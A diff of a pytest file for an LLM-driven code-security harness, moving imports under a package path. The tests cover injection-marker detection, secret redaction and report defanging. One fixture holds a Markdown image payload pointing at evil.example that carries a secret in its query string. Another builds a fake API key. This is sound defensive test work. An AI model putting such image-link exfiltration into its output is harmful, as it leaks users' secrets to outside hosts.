@@ -7,21 +7,21 @@ import os
 import pytest
 import yaml
 
-from agents.blackbox.threat_modeler import AutomatedThreatModeler
-from agents.whitebox.ai_static_scanner import AISecurityStaticScanner
-from agents.whitebox.ast_extractor import ASTExtractor
-from agents.whitebox.multi_reviewer import HeterogeneousReviewerEnsemble
-from core.codecheck import check_test_code
-from core.codecontext import render_symbols
-from core.llm_gateway import ConfigError, LLMGateway, LLMGatewayError
-from core.models import FindingSeverity, ReviewFinding
-from core.sanitize import (
+from vibeharness.agents.blackbox.threat_modeler import AutomatedThreatModeler
+from vibeharness.agents.whitebox.ai_static_scanner import AISecurityStaticScanner
+from vibeharness.agents.whitebox.ast_extractor import ASTExtractor
+from vibeharness.agents.whitebox.multi_reviewer import HeterogeneousReviewerEnsemble
+from vibeharness.core.codecheck import check_test_code
+from vibeharness.core.codecontext import render_symbols
+from vibeharness.core.llm_gateway import ConfigError, LLMGateway, LLMGatewayError
+from vibeharness.core.models import FindingSeverity, ReviewFinding
+from vibeharness.core.sanitize import (
     UNTRUSTED_CODE_CLOSE, UNTRUSTED_CODE_OPEN, clean_model_text, find_injection_markers, find_invisible,
     find_secrets, markdown_safe, prepare_untrusted_code, redact_secrets, strip_invisible, untrusted_block,
 )
 
 REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-CONFIG = os.path.join(REPO_ROOT, "config", "agents_config.yaml")
+CONFIG = os.path.join(REPO_ROOT, "vibeharness", "config", "agents_config.yaml")
 
 # Built from code points so this file itself carries no invisible characters
 TAG_A = chr(0xE0041)
@@ -81,11 +81,9 @@ def test_ordinary_llm_app_text_is_not_flagged(text):
 def test_harness_source_passes_its_own_injection_rule():
     """Dogfooding: the rule once fired 27 times on this repository's own code (the bare verdict name),
     which also made any project that consumes the JSON report an evidence gap forever."""
-    files = [os.path.join(REPO_ROOT, "main.py")]
-    for sub in ("core", "agents", "reports", "runners"):
-        extractor = ASTExtractor()
-        extractor.parse_directory(os.path.join(REPO_ROOT, sub), max_files=100)
-        files += extractor.analyzed_files
+    extractor = ASTExtractor()
+    extractor.parse_directory(os.path.join(REPO_ROOT, "vibeharness"), max_files=100)
+    files = [os.path.join(REPO_ROOT, "main.py"), *extractor.analyzed_files]
     hits = [f for f in AISecurityStaticScanner().scan_files(files) if f.rule_id == "VH-AI-009"]
     assert hits == [], [(os.path.basename(h.file_path), h.line_number, h.evidence) for h in hits]
 
@@ -193,7 +191,7 @@ def test_api_base_must_be_https_or_loopback(tmp_path, base, ok):
 def test_provider_error_text_is_redacted_before_it_reaches_the_report(fake_live, monkeypatch):
     """An HTTP client exception can echo the request URL or headers, i.e. the API key; the call log's
     reason column lands in the Markdown provenance table, the JSON report and (live) stderr."""
-    from core.llm_gateway import LLMGatewayError
+    from vibeharness.core.llm_gateway import LLMGatewayError
     leaked = "AIza" + "B" * 35
     fake = fake_live(lambda s, u: "")
     def boom(**kwargs):
@@ -229,7 +227,7 @@ def test_reviewer_and_verifier_without_model_alias_show_as_unconfigured(tmp_path
     """The ensemble and the debater must resolve a missing model_alias exactly as the gateway
     routes it (`unconfigured`), not as the agent id's suffix: otherwise the report would show a
     model that was never called, and the debater's self-review exclusion would compare the wrong alias."""
-    from agents.whitebox.debater import MultiModelDebater
+    from vibeharness.agents.whitebox.debater import MultiModelDebater
     cfg = tmp_path / "cfg.yaml"
     cfg.write_text(
         "models:\n  claude: {model: m1, api_key_env: ANTHROPIC_API_KEY}\n"
@@ -379,7 +377,7 @@ def test_llm_checklist_is_added_only_for_ai_targets(fake_live):
 
 
 def test_threat_rules_catalogue_is_complete():
-    rules = yaml.safe_load(open(os.path.join(REPO_ROOT, "config", "threat_rules.yaml"), encoding="utf-8"))
+    rules = yaml.safe_load(open(os.path.join(REPO_ROOT, "vibeharness", "config", "threat_rules.yaml"), encoding="utf-8"))
     entries = rules["owasp_llm_top10_2026"]
     assert [e["id"] for e in entries] == [f"LLM{i:02d}:2026" for i in range(1, 11)]
     assert entries[7]["name"] == "Hidden Context Exposure"
@@ -389,7 +387,7 @@ def test_threat_rules_catalogue_is_complete():
 # --- End to end: deterministic hits drive the gate and the reports --------------------------------------
 
 def _run(tmp_path, code):
-    from core.harness import VibeHarnessCommander
+    from vibeharness.core.harness import VibeHarnessCommander
     target = tmp_path / "target"
     target.mkdir()
     (target / "app.py").write_text(code, encoding="utf-8")
@@ -431,8 +429,8 @@ def test_planted_reviewer_instruction_is_an_evidence_gap(tmp_path):
 
 
 def test_markdown_report_defangs_model_authored_images(tmp_path):
-    from core.models import MultiModelDebateResult, ThreatModelReport, VibeHarnessSummary
-    from reports.report_generator import ReportGenerator
+    from vibeharness.core.models import MultiModelDebateResult, ThreatModelReport, VibeHarnessSummary
+    from vibeharness.reports.report_generator import ReportGenerator
     finding = ReviewFinding(
         finding_id="WB-GEM-01", reviewer_name="Gemini", model_alias="gemini", file_path="app.py",
         severity=FindingSeverity.HIGH, title="Leak ![x](https://evil.example/?q=secret)", description="d",
@@ -455,8 +453,8 @@ def test_markdown_report_defangs_model_authored_images(tmp_path):
 def test_markdown_report_defangs_evidence_gaps_and_untested_threat_ids(tmp_path):
     """Evidence-gap reasons quote model-chosen ids and failure text, and untested threat ids come
     straight from the threat modeler: both lists must get the same defanging as every other cell."""
-    from core.models import MultiModelDebateResult, ThreatModelReport, VibeHarnessSummary
-    from reports.report_generator import ReportGenerator
+    from vibeharness.core.models import MultiModelDebateResult, ThreatModelReport, VibeHarnessSummary
+    from vibeharness.reports.report_generator import ReportGenerator
     md = ReportGenerator().generate_markdown_report(
         summary=VibeHarnessSummary(
             overall_status="INCONCLUSIVE", total_whitebox_findings=0, confirmed_whitebox_bugs=0,
@@ -482,7 +480,7 @@ def _fake_completion(monkeypatch, calls, content, finish_reason):
         calls.append(kwargs)
         choice = SimpleNamespace(message=SimpleNamespace(content=content), finish_reason=finish_reason)
         return SimpleNamespace(choices=[choice])
-    monkeypatch.setattr("core.llm_gateway.litellm", SimpleNamespace(completion=completion))
+    monkeypatch.setattr("vibeharness.core.llm_gateway.litellm", SimpleNamespace(completion=completion))
 
 
 def test_per_model_output_limit_overrides_the_global_one(fake_live, monkeypatch, tmp_path):
@@ -541,7 +539,7 @@ def test_bedrock_model_authenticates_with_an_aws_profile(tmp_path, monkeypatch):
 # --- Audit trail: the generated tests' code is kept in the reports ---------------------------------------
 
 def _report_inputs():
-    from core.models import (
+    from vibeharness.core.models import (
         GeneratedTest, MultiModelDebateResult, TestExecutionResult, TestStatus, ThreatModelReport,
         VibeHarnessSummary,
     )
@@ -576,7 +574,7 @@ def _report_inputs():
 
 
 def test_markdown_appendix_shows_each_tests_code_with_its_outcome():
-    from reports.report_generator import ReportGenerator
+    from vibeharness.reports.report_generator import ReportGenerator
     args, _ = _report_inputs()
     md = ReportGenerator().generate_markdown_report(**args)
     appendix = md[md.index("## 6. 🧪 Generated Test Code"):]
@@ -588,7 +586,7 @@ def test_markdown_appendix_shows_each_tests_code_with_its_outcome():
 
 
 def test_appendix_code_cannot_break_out_of_its_fence_or_inject_html():
-    from reports.report_generator import ReportGenerator
+    from vibeharness.reports.report_generator import ReportGenerator
     args, _ = _report_inputs()
     appendix = ReportGenerator().generate_markdown_report(**args).split("## 6. 🧪 Generated Test Code")[1]
     assert "`````python\n" in appendix          # fence longer than the code's 4-backtick run
@@ -598,7 +596,7 @@ def test_appendix_code_cannot_break_out_of_its_fence_or_inject_html():
 
 
 def test_json_report_keeps_generated_test_code_verbatim():
-    from reports.report_generator import ReportGenerator
+    from vibeharness.reports.report_generator import ReportGenerator
     args, hostile = _report_inputs()
     payload = json.loads(ReportGenerator().generate_json_report(**args))
     assert [t["code"] for t in payload["whitebox"]["generated_tests"]][1] == hostile
@@ -606,7 +604,7 @@ def test_json_report_keeps_generated_test_code_verbatim():
 
 
 def test_reports_without_tests_have_no_appendix():
-    from reports.report_generator import ReportGenerator
+    from vibeharness.reports.report_generator import ReportGenerator
     args, _ = _report_inputs()
     args.update(whitebox_tests=None, blackbox_tests=None)
     assert "Generated Test Code" not in ReportGenerator().generate_markdown_report(**args)
